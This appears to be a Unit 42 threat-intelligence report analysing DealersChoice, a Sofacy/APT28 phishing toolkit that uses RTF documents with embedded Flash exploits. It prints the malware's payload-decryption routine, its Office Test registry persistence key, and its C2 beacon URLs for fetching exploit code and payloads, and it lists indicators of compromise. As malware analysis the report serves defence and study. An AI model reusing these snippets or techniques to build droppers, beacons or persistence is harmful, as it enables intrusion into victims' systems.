In the same](https://blog.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/)\ntimeframe of the Komplex attacks, we collected several weaponized documents that use a\ntactic previously not observed in use by the Sofacy group. Weaponizing documents to exploit\nknown Microsoft Word vulnerabilities is a common tactic deployed by many adversary\ngroups, but in this example, we discovered RTF documents containing embedded OLE Word\ndocuments further containing embedded Adobe Flash (.SWF) files, designed to exploit Flash\nvulnerabilities rather than Microsoft Word. We have named this tool that generates these\ndocuments DealersChoice.\n\nIn addition to the discovery of this new tactic, we were able to identify two different variants\nof the embedded SWF files: the first being a standalone version containing a compressed\npayload which we have dubbed DealersChoice.A and a second variant being a much more\n\n\n-----\n\nmodular version deploying additional anti-analysis techniques which we have dubbed\nDealersChoice.B. The unearthing of DealersChoice.B suggests a possible code evolution of\nthe initial DealersChoice.A variant. Also, artifacts within DealersChoice suggests that Sofacy\ncreated it with the intentions to target both Windows and OSX operating systems, as\nDealersChoice could potentially be cross-platform due to its use of Adobe Flash files.\n\nTargeting data of Sofacy group attacks remain limited, but we were able to identify a\nUkrainian based defense contractor as well as the Ministry of Foreign Affairs of a nation state\nin that same region as being targeted by these attacks. The following post focuses on our\nstudy of DealersChoice, though it is worth noting that the U.S. government has recently\nattributed many of the same indicators of compromise associated with this entity during the\nDNC intrusion to Russia. (Sofacy, also known as APT 28, is a group commonly attributed to\nRussia.)\n\n## DealersChoice Attacks\n\nBased on our telemetry, the attacks delivering DealersChoice documents occurred in August\n2016 and focused primarily on organizations in countries that were part of the former Soviet\nrepublic. These malicious documents were delivered to a Ukrainian-based defense\ncontractor as well as a Ministry of Foreign Affairs of a nation state in the same region, both\nvia phishing attacks.\n\nWe were able to collect the actual phishing email targeting the Ukrainian based defense\ncontractor, which can be seen in Figure 1. The emails shows a fairly well crafted phish, which\nhad a spoofed sender address masquerading as part of the European Parliament’s Press\nUnit and used an existing person’s signature block to increase the appearance of legitimacy.\nThe file attachment is a sample of the DealersChoice.A variant named Bulletin.doc\ncontaining details about a possible Russian invasion of Ukraine.\n\n\n-----\n\n_Figure 1 Attack Email Delivered to Ukrainian defense organization and MFA of nearby_\n_country_\n\nIf the recipient opens the Bulletin.doc attachment, a decoy document is displayed that has a\ntitle of “Russian invasion possible ‘at any minute’”, as seen in Figure 2. The contents of the\ndecoy document were copied and pasted from an August 7, 2016 article posted at the Irish\nTimes with very little modification.\n\n\n-----\n\n_Figure 2 Decoy document displayed by DealersChoice documents on Possible Russian_\n_Invasion of Ukraine_\n\nDuring our analysis of the DealersChoice delivery document, we found a second, albeit\ndifferent, version of DealersChoice that we do not have the associated targeting information,\nalthough we believe it was delivered in another phishing attack. This additional sample also\nopened a decoy document, which in this case was a document detailing Turkish politics.\nAgain, it appears the threat actors took content from an online news article, as the contents\n[in this decoy documents match an August 4, 2016 article posted to the Huffington Post.](http://www.huffingtonpost.com/yusuf-muftuoglu/west-turkey-coup_b_11315852.html)\nFigure 3 shows this decoy content, which in this case the threat actors appear to be less\ncareful when they copied and pasted the content, as they introduced a spelling error (see\n“STANBUL”) at the beginning of the document.\n\n\n-----\n\n_Figure 3 Decoy document opened by the additional DealersChoice sample_\n\n## Deal with it\n\nWhile the decoy documents are displayed to victim, the DealersChoice delivery document is\nbusy carrying out malicious activities in an attempt to exploit the system. As previously\nmentioned, we have seen two different variations of DealersChoice. Both variations share a\ncommon core of components, however, how they exploit vulnerabilities and install the\npayload is markedly different. We will describe specifics on how both DealersChoice.A and\nDealersChoice.B operate in further sub-sections; however, we need to first describe the core\ncomponents shared between the two.\n\nAt face value, DealersChoice is a rich text file (RTF) that has two responsibilities: display the\ndecoy content embedded within the RTF and to load an embedded Word document (OLE).\nThe Word document loads an embedded Flash file (SWF), which ultimately executes\nActionScript that begins the malicious activity on the system. The ActionScript within the\nembedded Flash file, specifically the code and the actions it carries out is where the two\nvariants of DealersChoice differ. As depicted in the diagram in Figure 4, the ActionScript in\nDealersChoice.A checks the version of Flash player and attempts to exploit a vulnerability by\n\n\n-----\n\nloading one of three embedded Flash files (SWF) to install an embedded payload. The\nActionScript in DealersChoice.B differs dramatically, as it contacts a C2 server to receive a\nFlash file and a payload in order to exploit a vulnerability and install a Trojan.\n\n_Figure 4 DealersChoice variants A and B use different approaches to achieve the same goal_\n\nAs you can see, DealersChoice.A is more of a standalone toolkit with all components\nembedded within one file, whereas DealersChoice.B requires an active C2 server to obtain\nadditional resources required to exploit the system. The filename “allInFlash.swf” of the Flash\nfile embedded in the Word document of DealersChoice.A suggests it author intended it to be\nstandalone as well.\n\n## DealersChoice.A\n\nThe DealersChoice.A variant is a standalone tool that contains all the necessary components\nto exploit the system. Based on embedded metadata, the DealersChoice.A SWF file was\ncreated on August 15, 2016, which is the same day in which the attack on the Ukrainian\ndefense organization and a day before the attack on the targeted Ministry of Foreign Affairs.\n\n\n-----\n\nThe Flash SWF file that contained the malicious ActionScript also had four files embedded\nwithin it, named ExtSwf, ExtSwf1, ExtSwf2 and Main22_Pay. The ActionScript uses the zlib\nlibrary to decompress the Main22_Pay file, which contains the shellcode and the payload\nthat the shellcode will install on the system. The ActionScript will check the version of Flash\nplayer and will use zlib to decompress followed by a decryption routine (0xb7 as a key) on\none of the ExtSwf, ExtSwf1 or ExtSwf2 files as an embedded SWF. The following\nActionScript shows the custom algorithm that will decrypt the embedded SWF file:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nprivate function unpack(ciphertext:ByteArray, akey:uint) : ByteArray\n{\nciphertext.position = 0;\nvar key:uint = akey;\nvar count:uint = 0;\nwhile(count < ciphertext.length)\n{\nkey = key >> 1 ^ ((key & 64) >> 6 ^ (key & 32) >> 5 ^ (key & 2) >> 1 ^ (key & 8) >>\n3) << 7;\nciphertext[count] = ciphertext[count] ^ key;\ncount++;\n}\nciphertext.position = 0;\nciphertext.uncompress();\nciphertext.position = 0;\nreturn ciphertext;\n}\n\n\nThe embedded SWF decrypted contains ActionScript that attempts to exploit a vulnerability.\nThe purpose of aforementioned version check is to make sure that the correct malicious\nActionScript is executed to exploit a vulnerability that the Flash player is vulnerable to. Table\n1 shows the range of Flash player versions within DealersChoice.A, the embedded SWF file\nloaded and the associated vulnerability exploited by the loaded SWF.\n\n**Flash Player Version** **Embedded File** **CVE Exploited**\n\n11.5.502.146 - 19.0.0.207 ExtSwf1 [CVE-2015-7645](https://helpx.adobe.com/security/products/flash-player/apsa15-05.html)\n\n20.0.0.228 - 20.0.0.306 ExtSwf [CVE-2016-1019](https://helpx.adobe.com/security/products/flash-player/apsa16-01.html)\n\n20.0.0.306 - 21.0.0.242 ExtSwf2 [CVE-2016-4117](https://helpx.adobe.com/security/products/flash-player/apsa16-02.html)\n\n_Table 1 Versions of Flash player DealersChoice.A looks for and the associated vulnerability_\n_exploited_\n\nIt appears the author(s) of DealersChoice did extensive research, as the range of versions\nfor each vulnerability aligns with the vulnerable versions as described in the vendor’s\nadvisory. It should also be noted that if the Flash version on the system is not within these\n\n\n-----\n\nranges, DealersChoice will not load any of the malicious SWF files and therefore not attempt\nto exploit the system.\n\nThe result of exploiting any of the vulnerabilities listed in Table 1 is the execution of shellcode\nfrom the Main22_Pay file embedded within the SWF. The shellcode appears to use the\nMersenne Twister algorithm with an initial seed value of 0xD01A7C2 to generate a pseudorandom number to use as a key to decrypt an embedded payload. Once decrypted, the\nshellcode installs the payload to %APPDATA%\\Local\\nshwmpfs.dll (SHA256:\n73db52c0d4e31a00030b47b4f0fa7125000b19c6c9d462c3d0ce0f9d68f04e4c). The\nshellcode also creates the following registry key for persistence, which is the Office Test\nPersistence method used by Sofacy in previous attacks:\n\n\n1\n2\n\n\nHKCU\\Software\\Microsoft\\Office test\\Special\\Perf:\nUsers\\Administrator\\AppData\\Local\\nshwmpfs.dll\n\n\nThe ‘nshwmpfs.dll’ payload is a sample of Sofacy’s Carberp-based tool, which is very similar\n[to the payload we described in our previous blog. This payload communicates with](https://blog.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/)\nservicecdp[.]com as its C2 server, which is also mentioned in our prior blog as well, which\nsuggests the Sofacy group is reusing their infrastructure across separate attacks.\n\nWhile analyzing DealersChoice.A, we found an interesting artifact in the \"ExtSwf\" SWF file,\nwhich sets a flag with the following line of code if the system is running on Apple's OSX\noperating system:\n\n1 static var _osx = System.capabilities.version.toUpperCase().indexOf(\"MAC\") >= 0;\n\nThis artifact is interesting as the shellcode executed relies on Windows APIs and the payload\ninstalled is a Windows DLL that would not run on OSX. This flag does suggest that the threat\nactors do consider the OSX operating system when developing their malicious exploit code\nin cross platform file types, such as Flash SWF files. While we cannot confirm this, it is\npossible that the threat actors could use DealersChoice.A to exploit and load an OSX Trojan\nif prepared with the appropriate shellcode.\n\n## DealersChoice.B\n\nWhile researching DealersChoice.A, we found DealersChoice.B delivery documents that\nshared many of the same attributes, but were newer as the metadata within the embedded\nFlash file suggests they were created on August 25, 2016. DealersChoice.B documents are\nslightly different than their predecessors, specifically in that they do not contain three\nseparate SWF files to exploit vulnerabilities on the system. Instead, DealersChoice.B relies\non an active C2 server to provide a malicious SWF file to exploit a vulnerability, as well as\nthe payload to execute. We presume that the threat actor checks the version of Flash player\nat the C2 and loads the malicious exploit code on the fly. We named these documents\n\n\n-----\n\nDealersChoice.B based on this difference. During our analysis, the C2 server was not\noperational so we were unable to obtain the malicious SWF or payload associated with this\ndelivery document.\n\nThe core components of DealersChoice are in variant B, specifically an RTF file with an\nembedded Word document that loads an embedded Flash file (SWF). However, the Flash file\nin variant B are different than its predecessor, which contains one embedded file named\nMain64_Pay. The Main64_Pay file is decompressed using the zlib library and decrypted\nusing the same algorithm as discussed in the DealersChoice.A section, but using 0x8f as a\nkey instead of 0xb7. When loaded, Main64_Pay runs ActionScript in a function named\n“Main32”, which begins creating and sending HTTP GET request to the following URL:\n\n1 http://appexsrv[.]net/search.php?<Capabilities.serverString>\n\nThe <Capabilities.serverString> portion of the URL is the output of the read only string\nprovided within the flash.system.Capabilities.serverString property, which contains a string of\nsystem specific information that the webserver can use to determine the system's operating\nsystem, Flash version and more. During our analysis, the HTTP GET request appears as the\nfollowing, which shows the system specific information sent to the C2 server:\n\nWe believe the threat actors use the system information in this beacon for the following\nreasons (and possibly others):\n\n1. Determine the version of Flash to serve an appropriate malicious SWF to exploit a\n\nvulnerability in that version of Flash\n2. Determine the operating system to provide the appropriate payload, possibly making\n\nthis a cross-platform exploit framework\n3. Filter out analysis systems based on operating system, architecture, screen resolution\n\nand/or language\n\nIf the C2 server is operational, it is going to respond to the beacon to “server.php” with data\nthat include variables named \"k1\",\"k2\",\"k3\" and \"k4\". The function is going to use the value in\nthe \"k1\" variable in another HTTP request to the following URL:\n\n1 http://appexsrv[.]net/api/v1/<k1 variable>/<Capabilities.serverString>\n\n\n-----\n\nThe C2 will respond to this request with a compressed and encrypted SWF file as the\nresponse data. The function uses the \"k3\" variable as a key to decrypt the SWF using the\nsame encryption algorithm, and will then make another request to the following URL:\n\n1 http://appexsrv[.]net/api/v1/<k2 variable>/<Capabilities.serverString>\n\nThe C2 server will respond to this request with compressed and encrypted binary data that\nthe function will decrypt using the \"k4\" variable as a key using the same encryption\nalgorithm. The decrypted binary data is the payload that is loaded into memory, suggesting\nthe payload provided by the C2 server will be similar to the payload embedded in the other\nversion of this toolkit, specifically starting with shellcode that decrypts and installs an\nembedded DLL.\n\n## Infrastructure\n\nAmongst the two known DealersChoice variants, DealersChoice.A was found to drop a\npayload onto the victim host after exploiting an available Adobe Flash vulnerability which\nthen communicated with a C2 server located at servicecdp[.]com. This C2 was previously\n[reported on by Unit 42 in a June 2016 blog regarding an attack campaign targeting](https://blog.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/)\ngovernment organizations. The payload discovered communicating to servicecdp[.]com in\nJune was then linked to other Sofacy group attacks in that time frame using the same\nMicrosoft Word DLL side-loading technique.\n\nWhile we were unable to retrieve the payload for DealersChoice.B, we were able to identify\nappexsrv[.]net as the C2 server used to deliver the malicious exploit code and the payload.\nExamination of passive DNS records did not show overlaps with previous attack campaigns,\nbut we were able to identify two other domains, appexrv[.]com and upmonserv[.]net\n[registered by the same email address, Kellen.green82@mail.com. These additional domains](http://10.10.0.46/mailto:Kellen.green82@gmail.com)\ndo not appear to be active C2s at this time. Figure 5 shows the infrastructure and samples\nassociated with DealersChoice.\n\n\n-----\n\n_Figure 5 Infrastructure and samples associated with DealersChoice_\n\n## Evidence of a Tiered Infrastructure\n\nThe remote server used by DealersChoice.B to obtain its malicious exploit code and its\npayload is appexsrv[.]net (resolved to 95.183.50.23). During our analysis, the remote server\ndid not serve a SWF file or a payload, but instead it responded with the following HTTP 503\nerror that is quite interesting:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nHTTP/1.1 503 Service Unavailable\nServer: squid\nMime-Version: 1.0\nDate: Wed, 05 Oct 2016 13:12:12 GMT\nContent-Type: text/html\nContent-Length: 0\nX-Squid-Error: ERR_CONNECT_FAIL 110\nConnection: keep-alive\n\n\nThe HTTP 503 error shows that the server at 95.183.50.23 is running a Squid HTTP proxy.\nThe response shows that the proxy was unable to connect to the server that the proxy is\nconfigured to communicate, specifically with a 110 error that occurs when the connection\ntimed out. This suggests that the server is most likely set up as a transparent proxy to\nforward HTTP requests to another server. The use of this Squid proxy suggests the threat\nactors want to conceal the true location of their C2 server.\n\n## Conclusion\n\n\n-----\n\nDealersChoice is an exploit platform that allows the Sofacy threat group to exploit\nvulnerabilities in Adobe Flash. Cross-platform exploits are obviously a focus for Sofacy, as\nthey included checks within DealersChoice to determine the operating system of the targeted\nsystem. These checks were specifically for Apple’s OS X operating system, which coupled\n[with our discovery of Sofacy’s Komplex OSX Trojan suggests that this threat group is](https://blog.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/)\ncapable of operating in both Windows and Apple environments. Our analysis of\nDealersChoice has also led us to the discovery of a potential tiered infrastructure that\nleverages transparent proxies to hide the true location of Sofacy’s C2 servers.\n\nPalo Alto Networks customers are protected from DealersChoice delivery documents and the\nSofacy Carberp payload via:\n\nWildFire detection of all known samples as malicious\nAll known C2s are classified as malicious in PAN-DB\nTraps was able to block exploit code used by DealersChoice\n\nAutoFocus customers can gather additional information on DealersChoice and Sofacy\nCarberp via:\n\n[AutoFocus tags have been created DealersChoice](https://autofocus.paloaltonetworks.com/#/tag/Unit42.DealersChoice)\nPayload matches SofacyCarberp tag in AutoFocus\n\n## Indicators of Compromise\n\n**DealersChoice.A**\n\ndc2c3314ef4e6186b519af29a246679caa522acd0c44766ecb9df4d2d5f3995b\n\n**DealersChoice.B**\n\ncc68ed96ef3a67b156565acbea2db8ed911b2b31132032f3ef37413f8e2772c5\n\naf9c1b97e03c0e89c5b09d6a7bd0ba7eb58a0e35908f5675f7889c0a8273ec81\n\n**DealersChoice.B C2**\n\nappexsrv[.]net\n\n**Sofacy Carberp**\n\n73db52c0d4e31a00030b47b4f0fa7125000b19c6c9d462c3d0ce0f9d68f04e4c\n\n**Sofacy Carberp C2**\n\nservicecdp[.]com\n\n\n-----\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
